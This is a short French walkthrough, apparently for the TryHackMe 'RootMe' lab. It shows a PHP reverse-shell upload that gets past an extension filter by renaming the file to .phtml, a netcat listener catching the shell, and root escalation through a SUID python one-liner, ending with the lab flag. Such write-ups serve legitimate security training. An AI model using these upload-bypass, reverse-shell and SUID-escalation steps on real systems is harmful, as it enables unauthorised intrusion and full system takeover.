

downlaods un reverse shell sur: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
1. unziper le file et modifier dans le .php file le reverse IP.	
2. incompatibilité durant le uploads avec les  PHP file.. 
      **Donc! simplement modifier le  .php -> .phtml 
3. démarrer un listenner NetCat  ( nc -nvlp 1234 )
4. ouvrir le reverse shell http://10.10.10.10/uploads/revshell.phtml
5. regarde NetCat si la connection est effective
```bash
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.13.3.214] from (UNKNOWN) [10.10.70.208] 56574
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:57:02 up 19 min,  0 users,  load average: 0.00, 0.03, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$  python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@rootme:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
# ls
ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
# cd root
cd root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
# 

```


find / -perm /4000 |  grep "permision"

/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
